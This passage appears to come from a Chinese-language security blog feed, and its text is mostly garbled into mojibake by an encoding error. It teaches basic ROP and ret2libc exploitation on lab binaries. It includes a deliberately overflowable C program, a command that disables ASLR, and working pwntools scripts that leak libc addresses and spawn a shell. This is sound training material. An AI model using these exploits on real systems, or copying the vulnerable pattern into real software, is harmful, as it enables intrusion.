IPè¿™ä¸€æ­¥è€Œå·²ï¼Œå…¶ä»–æ­¥éª¤ä¸æ­£å¸¸å‡½æ•°è°ƒç”¨å¹¶æ— åŒºåˆ«ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å°†Fillerçœ‹åšæ˜¯ä¿å­˜çš„è¿”å›åœ°å€EIPçš„è¯ï¼Œé‚£ä¹ˆå®ƒâ€œ<strong>ä¹‹å(ç›¸å¯¹æ ˆå¢é•¿æ–¹å‘è€Œè¨€)</strong>â€çš„æ•°æ®å°±è‡ªç„¶è€Œç„¶å˜æˆäº†systemå‡½æ•°çš„å‚æ•°äº†ã€‚</p><h3 id="ç¤ºä¾‹1"><a href="#ç¤ºä¾‹1" class="headerlink" title="ç¤ºä¾‹1"></a>ç¤ºä¾‹1</h3><p>è®°å¾—å…³ASLR<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;&#96;&#96;&#96;C#undef _FORTIFY_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123;char buf[128];read(STDIN_FILENO, buf, 256);&#125;int main(int argc, char** argv) &#123;vulnerable_function();write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125143551.png" alt="Pasted image 20250125143551"><br>è§‚å¯Ÿæºä»£ç ï¼Œå‘ç°åœ¨<code>vulnerable_function()</code>å‡½æ•°ä¸­ï¼Œbufåªæœ‰128å­—èŠ‚è€Œ read()å‡½æ•°å¯ä»¥è¯»256ä¸ªå­—èŠ‚é€ æˆäº†ç¼“å†²åŒºæº¢å‡ºã€‚å› ä¸ºç°åœ¨å¼€å¯äº†DEPé˜²æŠ¤ï¼Œæ‰€ä»¥ä¸èƒ½å¾€æ ˆé‡Œé¢å†™å…¥shellcodeäº†ï¼Œé€šè¿‡å‰é¢å¯¹åŠ¨æ€é“¾æ¥çš„å­¦ä¹ çŸ¥é“åŠ¨æ€é“¾æ¥çš„ç¨‹åºåœ¨è¿è¡Œæ—¶æ‰ä¼šé“¾æ¥å…±äº«æ¨¡å—ï¼Œç”¨lddå‘½ä»¤æŸ¥çœ‹ç¨‹åºéœ€è¦çš„å…±äº«æ¨¡å—ï¼š<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125143544.png" alt="Pasted image 20250125143544"><br>ç¨‹åºä¾èµ–çš„æ˜¯ libc.so.6 è¿™ä¸ªå…±äº«æ¨¡å—ï¼Œè¿™ä¸ªå…±äº«æ¨¡å—é‡Œé¢æä¾›äº†å¤§é‡å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰§è¡Œ system(â€œ/bin/shâ€) æ¥æ‰“å¼€shellï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦åœ¨ libc ä¸­æ‰¾åˆ°äº† system() å‡½æ•°å’Œ â€œ/bin/shâ€ å­—ç¬¦ä¸²çš„åœ°å€å°±å¯ä»¥æ§åˆ¶è¿”å›åœ°å€æ‰“å¼€shellã€‚</p><blockquote><p>è¿™é‡Œå¿˜å…³ä¿æŠ¤äº†ï¼ŒåŸºå€æ˜¯é”™è¯¯çš„ï¼Œexpä¸­æ˜¯æ­£ç¡®çš„</p><h4 id="1-æ‰¾system-å‡½æ•°"><a href="#1-æ‰¾system-å‡½æ•°" class="headerlink" title="1.æ‰¾system()å‡½æ•°"></a>1.æ‰¾system()å‡½æ•°</h4><p>å› ä¸ºå…³é—­äº† ASLR ï¼Œå…±äº«åº“çš„åŠ è½½åŸºå€å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œåªè¦çŸ¥é“ system() å‡½æ•°åœ¨å…±äº«åº“ä¸­çš„åç§»å°±èƒ½å¤Ÿç®—å‡º system() å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚ä½¿ç”¨ objdump -T libc.so.6 å‘½ä»¤å°±å¯ä»¥æ˜¾ç¤ºå¤„æ‰€æœ‰çš„åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨ã€‚<br><code>objdump -T libc.so.6 |grep system</code><br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125143504.png" alt="Pasted image 20250125143504"><br>system()å‡½æ•°åç§»ä¸º0x00050430ï¼ŒåŠ ä¸ŠåŸºå€0xed4d2000ï¼Œä¸¤è€…ç›¸åŠ å°±æ˜¯è¿™ä¸ªåœ°å€å°±æ˜¯libcåŠ è½½åˆ°å†…å­˜ç©ºé—´å system() å‡½æ•°çš„çœŸå®åœ°å€ã€‚</p></blockquote><h4 id="2-æŸ¥æ‰¾-bin-sh-å­—ç¬¦ä¸²"><a href="#2-æŸ¥æ‰¾-bin-sh-å­—ç¬¦ä¸²" class="headerlink" title="2.æŸ¥æ‰¾ /bin/sh å­—ç¬¦ä¸²"></a>2.æŸ¥æ‰¾ /bin/sh å­—ç¬¦ä¸²</h4><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250125144229.png" alt="Pasted image 20250125144229"><br>åŒç†å¯ç®—å‡ºçœŸå®åœ°å€</p><h4 id="3-è¦†ç›–è¿”å›åœ°å€"><a href="#3-è¦†ç›–è¿”å›åœ°å€" class="headerlink" title="3.è¦†ç›–è¿”å›åœ°å€"></a>3.è¦†ç›–è¿”å›åœ°å€</h4><p>cyclic<br>offsetä¸º140</p><h4 id="æ„é€ payload"><a href="#æ„é€ payload" class="headerlink" title="æ„é€ payload"></a>æ„é€ payload</h4><p>è¿”å›åœ°å€å¤„æ”¾ç½® system() å‡½æ•°çš„åœ°å€ä½¿å½“å‡½æ•°è¿è¡Œå®Œæ¯•æ—¶è·³è½¬åˆ° system() å‡½æ•°å¤„ç»§ç»­æ‰§è¡Œï¼Œ<strong>å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹æ˜¯å…ˆå°†å‚æ•°å…¥æ ˆï¼Œæ¥ç€ä¿å­˜è¿”å›åœ°å€ï¼Œæœ€åcall system</strong>ã€‚system_ret_addr æ˜¯ system() å‡½æ•°çš„åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æ‰“å¼€shellï¼Œ<strong>æ‰€ä»¥è¿™ä¸ªè¿”å›åœ°å€éšä¾¿è®¾ç½® ä¸€ä¸ªå€¼å°±å¯ä»¥</strong>ã€‚binsh_addr æ”¾ç½®çš„æ˜¯å‚æ•° â€œ/bin/shâ€ å­—ç¬¦ä¸²çš„åœ°å€<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *#context.log_level &#x3D; &#39;debug&#39;libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&#39;)debug &#x3D; 1if debug:sh &#x3D; process(&#39;.&#x2F;level1&#39;)system_addr &#x3D; 0x00050430 + 0xf7d70000print(system_addr)binsh_addr  &#x3D; 0x001c4de8 + 0xf7d70000print(binsh_addr)payload &#x3D; b&#39;a&#39; * 140 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)def pwn(sh, payload):sh.sendline(payload)sh.interactive()pwn(sh, payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="ç¤ºä¾‹2-bssæ®µä¸Šå†™â€™-bin-shâ€™"><a href="#ç¤ºä¾‹2-bssæ®µä¸Šå†™â€™-bin-shâ€™" class="headerlink" title="ç¤ºä¾‹2(bssæ®µä¸Šå†™â€™/bin/shâ€™)"></a>ç¤ºä¾‹2(bssæ®µä¸Šå†™â€™/bin/shâ€™)</h3><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127121126.png" alt="Pasted image 20250127121126"><br>checksecï¼ŒNXå¼€å¯ï¼Œä¸èƒ½å¾€æ ˆä¸Šå†™ä¸œè¥¿<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127120758.png" alt="Pasted image 20250127120758"><br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127120731.png" alt="Pasted image 20250127120731"><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127121002.png" alt="Pasted image 20250127121002"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env pythonfrom pwn import *sh &#x3D; process(&#39;.&#x2F;ret2libc2&#39;)gets_plt &#x3D; 0x08048460system_plt &#x3D; 0x08048490buf2 &#x3D; 0x804a080payload &#x3D; flat(    [&#39;a&#39; * 112, gets_plt, system_plt, buf2, buf2])sh.sendline(payload)sh.sendline(&#39;&#x2F;bin&#x2F;sh&#39;)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadè§£è¯»ï¼š<br>é¦–å…ˆä½¿ç”¨112ä¸ªAå­—ç¬¦å¡«å……æ ˆï¼Œä½¿æ ˆå‘ç”Ÿæº¢å‡ºï¼Œå†ç”¨getså‡½æ•°çš„pltåœ°å€æ¥è¦†ç›–åŸè¿”å›åœ°å€ï¼Œä½¿ç¨‹åºæµæ‰§è¡Œåˆ°getså‡½æ•°ï¼Œå‚æ•°å°±æ˜¯bssæ®µçš„åœ°å€ï¼ˆbssæ®µçš„å˜é‡ï¼‰ï¼Œç›®çš„æ˜¯ä¸ºäº†ä½¿ç”¨getså‡½æ•°å°†/bin/shå†™å…¥åˆ°bssæ®µä¸­ã€‚<br>æ¥ä¸‹æ¥åœ¨ä½¿ç”¨systemå‡½æ•°è¦†ç›–getså‡½æ•°çš„è¿”å›åœ°å€ï¼Œä½¿ç¨‹åºæ‰§è¡Œåˆ°systemå‡½æ•°ï¼Œå…¶å‚æ•°ä¹Ÿæ˜¯bssæ®µä¸­çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯/bin/shã€‚<br>æœ€åçš„sh.sendline(â€˜/bin/shâ€™)æ˜¯ä¸ºäº†å°†bssæ®µä¸Šå˜é‡çš„å†…å®¹æ›¿æ¢æˆ/bin/sh(ä¹Ÿå°±æ˜¯è¯´åœ¨æ‰§è¡Œsendline(â€˜/bin/shâ€™)ä¹‹å‰ï¼Œbssæ®µä¸Šçš„å˜é‡æœªè¢«åˆå§‹åŒ–ï¼Œå…¶å†…å®¹ä¸ºç©ºï¼‰ã€‚<br>payloadä¸­ç¬¬ä¸€ä¸ªbuf2æ˜¯getså‡½æ•°çš„å‚æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯systemçš„å‚æ•°</p><blockquote><p>æ³¨ï¼šç¨‹åºçš„èµ°å‘æ˜¯ç”±æ ˆæ¥å†³å®šçš„</p></blockquote><h3 id="ç¤ºä¾‹3ï¼ˆæ— systemåœ°å€å’Œ-bin-shåœ°å€ï¼‰"><a href="#ç¤ºä¾‹3ï¼ˆæ— systemåœ°å€å’Œ-bin-shåœ°å€ï¼‰" class="headerlink" title="ç¤ºä¾‹3ï¼ˆæ— systemåœ°å€å’Œ/bin/shåœ°å€ï¼‰"></a>ç¤ºä¾‹3ï¼ˆæ— systemåœ°å€å’Œ/bin/shåœ°å€ï¼‰</h3><p>checksecï¼Œ32ä½ï¼ŒNXå¼€å¯ï¼Œä¸èƒ½å¾€æ ˆä¸Šå†™ä¸œè¥¿<br><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127122302.png" alt="Pasted image 20250127122302"><br>cyclicå¾—åˆ°åç§»é‡ä¸º112<br>ç°åœ¨å½“åŠ¡ä¹‹æ€¥å°±æ˜¯å¾—åˆ°systemå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å¾—åˆ°å‘¢ï¼Ÿè¿™é‡Œå°±ä¸»è¦åˆ©ç”¨äº†ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><blockquote><p>1.systemå‡½æ•°å±äºlibcï¼Œè€Œ<strong>libc.soåŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„</strong>ã€‚<br>2.å³ä½¿ç¨‹åºæœ‰ASLRä¿æŠ¤ï¼Œ<strong>ä¹Ÿåªæ˜¯é’ˆå¯¹äºåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½çš„12ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜</strong>ã€‚è€Œlibcåœ¨githubä¸Šæœ‰äººè¿›è¡Œæ”¶é›†,å¦‚ä¸‹[<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a>]</p></blockquote><p>ä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·ç½‘ç«™ï¼š[<a href="https://libc.blukat.me/]ï¼Œè¿™ä¸ªç½‘å€çš„æ•°æ®åº“åŸºäºlibc-database">https://libc.blukat.me/]ï¼Œè¿™ä¸ªç½‘å€çš„æ•°æ®åº“åŸºäºlibc-database</a></p><p>åªè¦å¾—åˆ°libcçš„ç‰ˆæœ¬ï¼Œå¯çŸ¥é“systemå‡½æ•°å’Œ/bin/shçš„åç§»é‡ã€‚çŸ¥é“åç§»é‡åï¼Œå†æ‰¾åˆ°libcçš„åŸºåœ°å€ï¼Œå°±å¯ä»¥å¾—åˆ°systemå‡½æ•°çš„çœŸå®åœ°å€ï¼Œå°±å¯ä»¥åšæˆ‘ä»¬æƒ³è¦åšçš„äº‹æƒ…äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªå…¬å¼æ¥å¾—åˆ°systemçš„çœŸå®åœ°å€ã€‚</p><blockquote><p>libcåŸºåœ°å€+å‡½æ•°åç§»é‡ï¼å‡½æ•°çœŸå®åœ°å€</p></blockquote><p>å¯ä»¥æ³„éœ²ä¸€ä¸ªå‡½æ•°çš„çœŸå®åœ°å€ï¼Œç„¶åæ ¹æ®å…¬å¼å¯ä»¥å¾—åˆ°libcçš„åŸºåœ°å€ï¼Œå› ä¸ºçŸ¥é“äº†libcç‰ˆæœ¬ï¼Œå°±çŸ¥é“äº†å‡½æ•°åç§»é‡ã€‚</p><p>æˆ‘ä»¬è¯¥å¦‚ä½•æ³„éœ²å‡½æ•°çš„çœŸå®åœ°å€çš„ï¼Œè¿™é‡Œæ¶‰åŠåˆ°äº†libcçš„<strong>å»¶è¿Ÿç»‘å®šæŠ€æœ¯</strong><br>è¦æ³„éœ²å‡½æ•°çš„çœŸå®åœ°å€ï¼Œ<strong><em>ä¸€èˆ¬çš„æ–¹æ³•æ˜¯é‡‡ç”¨gotè¡¨æ³„éœ²ï¼Œå› ä¸ºåªè¦ä¹‹å‰æ‰§è¡Œè¿‡putså‡½æ•°ï¼Œgotè¡¨é‡Œå­˜æ”¾ç€å°±æ˜¯å‡½æ•°çš„çœŸå®åœ°å€äº†ï¼Œè¿™é‡Œç”¨çš„æ˜¯putså‡½æ•°ï¼Œç¨‹åºé‡Œå·²ç»è¿è¡Œè¿‡äº†putså‡½æ•°ï¼ŒçœŸå®åœ°å€å·²ç»å­˜æ”¾åˆ°äº†gotè¡¨å†…ã€‚æˆ‘ä»¬å¾—åˆ°putså‡½æ•°çš„gotåœ°å€åï¼Œå¯ä»¥æŠŠè¿™ä¸ªåœ°å€ä½œä¸ºå‚æ•°ä¼ é€’ç»™putså‡½æ•°ï¼Œåˆ™ä¼šæŠŠè¿™ä¸ªåœ°å€é‡Œçš„æ•°æ®ï¼Œå³putså‡½æ•°çš„çœŸå®åœ°å€ç»™è¾“å‡ºå‡ºæ¥ï¼Œè¿™æ ·å°±å¾—åˆ°äº†putså‡½æ•°çš„çœŸå®åœ°å€ã€‚</em></strong></p><p>è„šæœ¬å¦‚ä¸‹<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *p &#x3D; process(&#39;.&#x2F;libc3&#39;)elf &#x3D; ELF(&#39;.&#x2F;libc3&#39;)puts_got_addr &#x3D; elf.got[&#39;puts&#39;]#å¾—åˆ°putsçš„gotçš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€é‡Œçš„æ•°æ®å³å‡½æ•°çš„çœŸå®åœ°å€ï¼Œå³æˆ‘ä»¬è¦æ³„éœ²çš„å¯¹è±¡puts_plt_addr &#x3D; elf.plt[&#39;puts&#39;]#putsçš„pltè¡¨çš„åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨putså‡½æ•°æ³„éœ²main_plt_addr &#x3D; elf.symbols[&#39;_start&#39;]#è¿”å›åœ°å€è¢«è¦†ç›–ä¸ºmainå‡½æ•°çš„åœ°å€ã€‚ä½¿ç¨‹åºè¿˜å¯è¢«æº¢å‡ºprint (&quot;puts_got_addr &#x3D; &quot;,hex(puts_got_addr))print (&quot;puts_plt_addr &#x3D; &quot;,hex(puts_plt_addr))print (&quot;main_plt_addr &#x3D; &quot;,hex(main_plt_addr))payload &#x3D; b&#39;A&#39;*112payload +&#x3D; p32(puts_plt_addr)#è¦†ç›–è¿”å›åœ°å€ä¸ºputså‡½æ•°payload +&#x3D; p32(main_plt_addr)#è¿™é‡Œæ˜¯putså‡½æ•°è¿”å›çš„åœ°å€ã€‚payload +&#x3D; p32(puts_got_addr)#è¿™é‡Œæ˜¯putså‡½æ•°çš„å‚æ•°p.recv()p.sendline(payload)puts_addr &#x3D; u32(p.recv()[0:4])print (&quot;puts_addr &#x3D; &quot;,hex(puts_addr))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>æœ€åç†ä¸€ä¸‹æ€è·¯</p><ol><li>æ³„éœ²putså‡½æ•°çš„çœŸå®åœ°å€</li><li>å¾—åˆ°libcçš„ç‰ˆæœ¬</li><li>å¾—åˆ°systemå’Œputså’Œshçš„åç§»ï¼Œè®¡ç®—libcåŸºåœ°å€</li><li>è®¡ç®—systemå’Œshçš„çœŸå®åœ°å€</li><li>æ„é€ payloadä¸ºsystem(â€™/bin/shâ€™ï¼‰</li><li>å†™exp<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127174108.png" alt="Pasted image 20250127174108"></li></ol><p><img src="/2025/02/11/PWN%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP/Pasted image 20250127174002.png" alt="Pasted image 20250127174002"><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *p &#x3D; process(&#39;.&#x2F;libc3&#39;)elf &#x3D; ELF(&#39;.&#x2F;libc3&#39;)puts_got_addr &#x3D; elf.got[&#39;puts&#39;]puts_plt_addr &#x3D; elf.plt[&#39;puts&#39;]main_plt_addr &#x3D; elf.symbols[&#39;_start&#39;]print (&quot;puts_got_addr &#x3D; &quot;,hex(puts_got_addr))print (&quot;puts_plt_addr &#x3D; &quot;,hex(puts_plt_addr))print (&quot;main_plt_addr &#x3D; &quot;,hex(main_plt_addr))payload &#x3D; b&#39;A&#39;*112payload +&#x3D; p32(puts_plt_addr)payload +&#x3D; p32(main_plt_addr)payload +&#x3D; p32(puts_got_addr)p.recv()p.sendline(payload)puts_addr &#x3D; u32(p.recv()[0:4])print (&quot;puts_addr &#x3D; &quot;,hex(puts_addr))sys_offset &#x3D; 0x0050430sh_offset &#x3D; 0x1c4de8puts_offset &#x3D; 0x78140#æ ¹æ®å…¬å¼  libcåŸºåœ°å€  +  å‡½æ•°åç§»é‡   &#x3D;  å‡½æ•°çœŸå®åœ°å€   æ¥è®¡ç®—libc_base_addr &#x3D;  puts_addr-puts_offset#è®¡ç®—å‡ºlibcåŸºåœ°å€print(&quot;puts_offset&quot;,hex(puts_addr-libc_base_addr))sys_addr &#x3D; libc_base_addr + sys_offset #è®¡ç®—å‡ºsystemçš„çœŸå®åœ°å€sh_addr &#x3D; libc_base_addr + sh_offset #è®¡ç®—å‡º&#x2F;bin&#x2F;shçš„çœŸå®åœ°å€print (&quot;libc_base_addr &#x3D; &quot;,hex(libc_base_addr))print (&quot;sys_addr &#x3D; &quot;,hex(sys_addr))print (&quot;sh_addr &#x3D; &quot;,hex(sh_addr))payload &#x3D; b&#39;A&#39;*112payload +&#x3D; p32(sys_addr) #è¦†ç›–è¿”å›åœ°å€ä¸ºsystemå‡½æ•°payload +&#x3D; b&quot;AAAA&quot;  #systemçš„è¿”å›åœ°å€ï¼Œéšä¾¿è¾“ï¼Œå› ä¸ºä¹‹å‰è°ƒç”¨äº†system(&#39;&#x2F;bin&#x2F;sh&#39;)payload +&#x3D; p32(sh_addr)  #systemå‡½æ•°å‚æ•°p.sendline(payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><strong><em>æˆåŠŸgetshell</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€-åŠ¨æ€é“¾æ¥</title>
      <link href="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
      <url>/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆåŠ¨æ€é“¾æ¥ï¼ˆDynamic-linkingï¼‰"><a href="#ä»€ä¹ˆåŠ¨æ€é“¾æ¥ï¼ˆDynamic-linkingï¼‰" class="headerlink" title="ä»€ä¹ˆåŠ¨æ€é“¾æ¥ï¼ˆDynamic linkingï¼‰"></a>ä»€ä¹ˆåŠ¨æ€é“¾æ¥ï¼ˆDynamic linkingï¼‰</h2><p><strong>åŠ¨æ€é“¾æ¥</strong> æ˜¯æŒ‡åœ¨ç¨‹åºè£…è½½æ—¶é€šè¿‡ <strong>åŠ¨æ€é“¾æ¥å™¨</strong> å°†ç¨‹åºæ‰€éœ€çš„æ‰€æœ‰ <strong>åŠ¨æ€é“¾æ¥åº“(Dynamic linking library)</strong> è£…è½½è‡³è¿›ç¨‹ç©ºé—´ä¸­ï¼ˆ ç¨‹åºæŒ‰ç…§æ¨¡å—æ‹†åˆ†æˆå„ä¸ªç›¸å¯¹ç‹¬ç«‹çš„éƒ¨åˆ†ï¼‰ï¼Œ<em>å½“ç¨‹åºè¿è¡Œæ—¶æ‰å°†ä»–ä»¬é“¾æ¥åœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå®Œæ•´ç¨‹åºçš„è¿‡ç¨‹</em>ã€‚å®ƒè¯ç”Ÿçš„æœ€ä¸»è¦çš„åŸå› æ˜¯ <strong>é™æ€é“¾æ¥</strong> å¤ªè¿‡äºæµªè´¹å†…å­˜å’Œç£ç›˜çš„ç©ºé—´ï¼Œå¹¶ä¸”ç°åœ¨çš„è½¯ä»¶å¼€å‘éƒ½æ˜¯æ¨¡å—åŒ–å¼€å‘ï¼Œä¸åŒçš„æ¨¡å—éƒ½æ˜¯ç”±ä¸åŒçš„å‚å®¶å¼€å‘ï¼Œåœ¨ <strong>é™æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ï¼Œä¸€æ—¦å…¶ä¸­æŸä¸€æ¨¡å—å‘ç”Ÿæ”¹å˜å°±ä¼šå¯¼è‡´æ•´ä¸ªè½¯ä»¶éƒ½éœ€è¦é‡æ–°ç¼–è¯‘ï¼Œè€Œé€šè¿‡ <strong>åŠ¨æ€é“¾æ¥</strong> çš„æ–¹å¼å°±æ¨è¿Ÿè¿™ä¸ªé“¾æ¥è¿‡ç¨‹åˆ°äº†ç¨‹åºè¿è¡Œæ—¶è¿›è¡Œã€‚</p><h3 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><p>1ã€<strong>èŠ‚çœå†…å­˜ã€ç£ç›˜ç©ºé—´</strong><br>    ä¾‹å¦‚ç£ç›˜ä¸­æœ‰ä¸¤ä¸ªç¨‹åºï¼Œp1ã€p2ï¼Œä¸”ä»–ä»¬ä¸¤ä¸ªéƒ½åŒ…å« lib.o è¿™ä¸ªæ¨¡å—ï¼Œåœ¨ <strong>é™æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ä»–ä»¬åœ¨é“¾æ¥è¾“å‡ºå¯æ‰§è¡Œæ–‡ä»¶æ—¶éƒ½ä¼šåŒ…å« lib.o è¿™ä¸ªæ¨¡å—ï¼Œè¿™å°±é€ æˆäº†ç£ç›˜ç©ºé—´çš„æµªè´¹ã€‚å½“è¿™ä¸¤ä¸ªç¨‹åºè¿è¡Œæ—¶ï¼Œå†…å­˜ä¸­åŒæ ·ä¹Ÿå°±åŒ…å«äº†è¿™ä¸¤ä¸ªç›¸åŒçš„æ¨¡å—ï¼Œè¿™ä¹Ÿå°±ä½¿å¾—å†…å­˜ç©ºé—´è¢«æµªè´¹ã€‚å½“ç³»ç»Ÿä¸­åŒ…å«å¤§é‡ç±»ä¼¼ lib.o è¿™ç§è¢«å¤šä¸ªç¨‹åºå…±äº«çš„æ¨¡å—æ—¶ï¼Œä¹Ÿå°±ä¼šé€ æˆå¾ˆå¤§ç©ºé—´çš„æµªè´¹ã€‚<em>åœ¨ <strong>åŠ¨æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ï¼Œè¿è¡Œ p1 ï¼Œå½“ç³»ç»Ÿå‘ç°éœ€è¦ç”¨åˆ° lib.o ï¼Œå°±ä¼šæ¥ç€åŠ è½½ lib.o ã€‚è¿™æ—¶æˆ‘ä»¬è¿è¡Œ p2 ï¼Œå°±ä¸éœ€è¦é‡æ–°åŠ è½½ lib.o äº†ï¼Œå› ä¸ºæ­¤æ—¶ lib.o å·²ç»åœ¨å†…å­˜ä¸­äº†ï¼Œç³»ç»Ÿä»…éœ€å°†ä¸¤è€…é“¾æ¥èµ·æ¥ï¼Œæ­¤æ—¶å†…å­˜ä¸­å°±åªæœ‰ä¸€ä¸ª lib.o èŠ‚çœäº†å†…å­˜ç©ºé—´</em>ã€‚<br>2ã€<strong>ç¨‹åºæ›´æ–°æ›´ç®€å•</strong><br>    æ¯”å¦‚ç¨‹åº p1 æ‰€ä½¿ç”¨çš„ lib.o æ˜¯ç”±ç¬¬ä¸‰æ–¹æä¾›çš„ï¼Œç­‰åˆ°ç¬¬ä¸‰æ–¹æ›´æ–°ã€æˆ–è€…ä¸º lib.o æ‰“è¡¥ä¸çš„æ—¶å€™ï¼Œp1 å°±éœ€è¦æ‹¿åˆ°ç¬¬ä¸‰æ–¹æœ€æ–°æ›´æ–°çš„ lib.o ï¼Œé‡æ–°é“¾æ¥ååœ¨å°†å…¶å‘å¸ƒç»™ç”¨æˆ·ã€‚ç¨‹åºä¾èµ–çš„æ¨¡å—è¶Šå¤šï¼Œå°±è¶Šå‘æ˜¾å¾—ä¸æ–¹ä¾¿ï¼Œæ¯•ç«Ÿéƒ½æ˜¯ä»ç½‘ç»œä¸Šè·å–æ–°èµ„æºã€‚åœ¨ <strong>åŠ¨æ€é“¾æ¥</strong> çš„æƒ…å†µä¸‹ï¼Œç¬¬ä¸‰æ–¹æ›´æ–° lib.o åï¼Œç†è®ºä¸Šåªéœ€è¦è¦†ç›–æ‰åŸæœ‰çš„ lib.o ï¼Œå°±ä¸å¿…é‡æ–°é“¾æ¥æ•´ä¸ªç¨‹åºï¼Œåœ¨ç¨‹åºä¸‹ä¸€æ¬¡è¿è¡Œæ—¶ï¼Œæ–°ç‰ˆæœ¬çš„ç›®æ ‡æ–‡ä»¶å°±ä¼šè‡ªåŠ¨è£…è½½åˆ°å†…å­˜å¹¶ä¸”é“¾æ¥èµ·æ¥ï¼Œå°±å®Œæˆäº†å‡çº§çš„ç›®æ ‡ã€‚<br>3ã€<strong>å¢å¼ºç¨‹åºæ‰©å±•æ€§å’Œå…¼å®¹æ€§</strong><br>    <strong>åŠ¨æ€é“¾æ¥</strong> 